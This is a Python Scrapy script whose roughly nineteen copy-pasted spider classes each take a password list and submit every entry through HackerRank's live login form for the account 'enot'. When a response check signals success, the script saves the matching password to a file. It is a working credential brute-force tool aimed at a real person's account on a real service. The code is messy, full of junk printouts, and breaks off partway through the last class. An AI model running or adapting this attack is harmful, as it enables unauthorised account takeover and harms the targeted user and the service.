import scrapy
import logging
import sys

from scrapy.item import Item, Field
from scrapy.http import FormRequest
from scrapy.spider import Spider
from scrapy.utils.response import open_in_browser

from scrapy.crawler import CrawlerProcess


global c
c=0

class Spider1(scrapy.Spider):
	name = "ta1"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		

		response1 = response
		passwordlist = "1.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

		








class Spider2(scrapy.Spider):
	name = "ta2"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "2.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	








class Spider3(scrapy.Spider):
	name = "ta3"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "3.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	












class Spider4(scrapy.Spider):
	name = "ta4"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "4.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	













class Spider5(scrapy.Spider):
	name = "ta5"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "5.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw
		print'''enfdf
			sdfs
			sdfsdf
			sfd'''

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	











class Spider6(scrapy.Spider):
	name = "ta6"
	#headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'}
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	#logging.getLogger('scrapy').setLevel(logging.WARNING)


	def start_requests(self):
		headers= {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:48.0) Gecko/20100101 Firefox/48.0'}
		for url in self.start_urls:
			yield Request(url, headers=headers)


	def parse(self, response):
		global b

		response1 = response
		passwordlist = "6.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	













class Spider7(scrapy.Spider):
	name = "ta7"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "7.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	










class Spider8(scrapy.Spider):
	name = "ta8"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "8.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b

			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	












class Spider9(scrapy.Spider):
	name = "ta9"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "9.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	









class Spider10(scrapy.Spider):
	name = "ta10"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "10.txt"
		list = open(passwordlist, "r")
		
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	




















class Spider11(scrapy.Spider):
	name = "ta11"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "11.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	















class Spider12(scrapy.Spider):
	name = "ta12"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "12.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	












class Spider13(scrapy.Spider):
	name = "ta13"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "13.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	











class Spider14(scrapy.Spider):
	name = "ta14"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "14.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

 	












class Spider15(scrapy.Spider):
	name = "ta15"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "15.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	















class Spider16(scrapy.Spider):
	name = "ta16"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "16.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	















class Spider17(scrapy.Spider):
	name = "ta17"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "17.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	
















class Spider18(scrapy.Spider):
	name = "ta18"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "18.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ( (k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
			print "yesssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssssss                " + passed
			print b
			t = open('finalpass1.txt',"w")
			t.write(passed)
			print '''
			dwfss
			sd
			sdsfdfs
			sdvgsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdvs
			dvsdvsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdvsdv
			sdvsdvsd
			vsdv
			sdvsdvs
			dvsdvsd
			vsdvsdv
			sdvsdv
			sdvsdv
			sdvsdvsd
			vsdvsdvs
			dvsdv'''
			b=-1
			passw=passed
			print b

	














class Spider19(scrapy.Spider):
	name = "ta19"
	start_urls = ['https://www.hackerrank.com/login']
	global b
	global passw
	passw= '-1'
	b=0
	logging.getLogger('scrapy').setLevel(logging.WARNING)
	def parse(self, response):
		global b

		response1 = response
		passwordlist = "19.txt"
		list = open(passwordlist, "r")
		passwords = list.readlines()
		print len(passwords)
		k = 0
		while ((k < len(passwords)) ):
			passwords[k] = passwords[k].strip()
			formdata = {'login': 'enot','password': passwords[k]}
			yield FormRequest.from_response(response,
										formdata=formdata,
										clickdata={'name': 'commit'},
										callback=lambda r,passto=passwords[k] :self.parse1(r,passto))
			#print '.',

			k+=1
		print passw

	def parse1(self, response1,passed):
		global b
		global c
		c+=1
		global passw
		#print passed +"........."+ response1.body
		if(response1.body[10:11]=="t"):
